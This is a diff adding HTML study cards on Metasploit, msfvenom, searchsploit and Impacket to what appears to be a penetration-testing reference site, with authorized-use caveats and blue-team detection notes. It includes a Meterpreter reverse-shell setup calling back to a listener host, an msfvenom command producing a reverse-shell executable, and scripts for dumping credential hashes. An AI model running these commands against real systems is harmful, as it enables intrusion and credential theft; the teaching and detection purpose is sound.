@@ -42965,6 +42965,160 @@ keeping CMS plugins minimal and current.
 </div>
 </div>
 </div>
+<div class="topic">
+<div class="topic-header">
+<span class="topic-icon">🧨</span>
+<span class="topic-name">Metasploit Framework — Modules, Sessions &amp; Workflow</span>
+<span class="topic-badge">Exploitation</span>
+<span class="topic-chev">▶</span>
+</div>
+<div class="topic-body">
+<div class="concept-card">
+<div class="concept-label">Reference</div>
+<div class="concept-title">The Standard Exploitation Framework</div>
+<div class="concept-desc">
+Metasploit bundles thousands of exploits, payloads, and post-exploitation modules
+behind one workflow — the core tool for the exploitation phase and a PenTest+/OSCP
+staple. <em>Authorized targets only; every module here is for permission-based
+testing.</em>
+</div>
+<div class="dw">
+<div class="dt">▸ MODULE TYPES</div>
+<table class="ref-table" style="margin-bottom:14px">
+<tr><th>Type</th><th>Does</th></tr>
+<tr><td class="c-cyan">exploit</td><td>Delivers a payload via a vulnerability</td></tr>
+<tr><td class="c-cyan">payload</td><td>Code that runs post-exploit (e.g. Meterpreter)</td></tr>
+<tr><td class="c-cyan">auxiliary</td><td>Scanners, fuzzers, no payload</td></tr>
+<tr><td class="c-cyan">post</td><td>Post-exploitation (loot, pivot, persist)</td></tr>
+<tr><td class="c-cyan">encoder</td><td>Obfuscate payloads past simple filters</td></tr>
+</table>
+<div class="dt">▸ CONSOLE WORKFLOW</div>
+<pre class="code-block"><span class="fn">msfconsole</span>
+msf&gt; search type:exploit smb
+msf&gt; use exploit/windows/smb/...
+msf&gt; show options
+msf&gt; set RHOSTS <span class="num">10.0.0.5</span>
+msf&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf&gt; set LHOST <span class="num">10.0.0.1</span>
+msf&gt; run                        <span class="com"># → opens a session on success</span>
+msf&gt; sessions -i <span class="num">1</span>              <span class="com"># interact with session 1</span></pre>
+<div class="concept-desc" style="margin-top:8px">
+<strong class="c-amber">Blue-team note:</strong> default Meterpreter and
+stock modules have well-known signatures — EDR and AV catch them readily.
+Detection maps directly to ATT&amp;CK exploitation + C2 techniques.
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="topic">
+<div class="topic-header">
+<span class="topic-icon">📦</span>
+<span class="topic-name">msfvenom — Payload Generation</span>
+<span class="topic-badge">Exploitation</span>
+<span class="topic-chev">▶</span>
+</div>
+<div class="topic-body">
+<div class="concept-card">
+<div class="concept-label">Reference</div>
+<div class="concept-title">Standalone Payloads in Any Format</div>
+<div class="concept-desc">
+<strong class="c-cyan">msfvenom</strong> generates payloads outside the console —
+an executable, script, or shellcode you deliver during an authorized engagement
+(e.g. a reverse shell for a lab box you've been scoped to test). It pairs a
+payload with an output format and optional encoders.
+</div>
+<div class="dw">
+<pre class="code-block"><span class="com"># Windows reverse-shell EXE (lab/authorized use)</span>
+<span class="fn">msfvenom</span> -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=<span class="num">10.0.0.1</span> LPORT=<span class="num">4444</span> -f exe -o shell.exe
+
+<span class="com"># List payloads / formats</span>
+<span class="fn">msfvenom</span> --list payloads
+<span class="fn">msfvenom</span> --list formats</pre>
+<table class="ref-table" style="margin-top:10px">
+<tr><th>Flag</th><th>Meaning</th></tr>
+<tr><td><code>-p</code></td><td>Payload</td></tr>
+<tr><td><code>-f</code></td><td>Output format (exe, elf, raw, python, …)</td></tr>
+<tr><td><code>-e</code> / <code>-i</code></td><td>Encoder &amp; iterations (basic evasion)</td></tr>
+</table>
+<div class="concept-desc" style="margin-top:8px">
+<strong class="c-amber">Blue-team note:</strong> the LHOST/LPORT callback is
+the tell — outbound connections to an unusual host/port right after a file
+executes. Egress filtering + EDR behavioral rules catch it.
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="topic">
+<div class="topic-header">
+<span class="topic-icon">🗃️</span>
+<span class="topic-name">Searchsploit &amp; Exploit-DB — Finding Public Exploits</span>
+<span class="topic-badge">Exploitation</span>
+<span class="topic-chev">▶</span>
+</div>
+<div class="topic-body">
+<div class="concept-card">
+<div class="concept-label">Reference</div>
+<div class="concept-title">Match a Version to a Known Exploit</div>
+<div class="concept-desc">
+Once enumeration gives you exact software versions, the question is: is there a
+public exploit? <strong class="c-cyan">Exploit-DB</strong> is the archive;
+<strong class="c-cyan">searchsploit</strong> is its offline CLI (ships with Kali).
+<em>Vet before you run</em> — public PoCs can be broken, or booby-trapped.
+</div>
+<div class="dw">
+<pre class="code-block"><span class="fn">searchsploit</span> apache 2.4          <span class="com"># find exploits for a version</span>
+<span class="fn">searchsploit</span> -x php/webapps/1234  <span class="com"># view the exploit source</span>
+<span class="fn">searchsploit</span> -m php/webapps/1234  <span class="com"># copy it locally to inspect/edit</span></pre>
+<div class="concept-desc" style="margin-top:8px">
+<strong class="c-amber">Blue-team note:</strong> this is why
+<strong class="c-green">version-hiding + fast patching</strong> matter — the
+entire chain is "know the version → look up the exploit." Remove version banners
+and keep software current.
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="topic">
+<div class="topic-header">
+<span class="topic-icon">🐍</span>
+<span class="topic-name">Impacket — The Windows/AD Python Toolkit</span>
+<span class="topic-badge">Exploitation</span>
+<span class="topic-chev">▶</span>
+</div>
+<div class="topic-body">
+<div class="concept-card">
+<div class="concept-label">Reference</div>
+<div class="concept-title">Speak Windows Protocols From Linux</div>
+<div class="concept-desc">
+<strong class="c-cyan">Impacket</strong> is a collection of Python scripts that
+implement Windows network protocols (SMB, Kerberos, MSRPC) — the backbone of
+hands-on Active Directory testing. It lets you move laterally, dump creds, and
+execute commands with credentials you've legitimately obtained during an
+engagement. <em>Authorized AD environments only.</em>
+</div>
+<div class="dw">
+<table class="ref-table">
+<tr><th>Script</th><th>Does</th></tr>
+<tr><td><code>psexec.py</code></td><td>Command execution over SMB (SYSTEM shell)</td></tr>
+<tr><td><code>wmiexec.py</code></td><td>Quieter command exec via WMI</td></tr>
+<tr><td><code>secretsdump.py</code></td><td>Dump hashes (SAM, LSA, NTDS.dit)</td></tr>
+<tr><td><code>GetUserSPNs.py</code></td><td>Kerberoasting — request service tickets</td></tr>
+<tr><td><code>ntlmrelayx.py</code></td><td>Relay captured NTLM auth to other hosts</td></tr>
+</table>
+<div class="concept-desc" style="margin-top:10px">
+<strong class="c-amber">Blue-team note:</strong> these leave clear Windows
+Event Log traces — service creation (7045) for psexec, ticket requests (4769)
+for Kerberoasting, unusual SMB auth patterns for relay. Sysmon + a SIEM rule per
+technique catches them.
+</div>
+</div>
+</div>
+</div>
+</div>
 <!-- /domain-body redteam -->
 </div>
 </div>
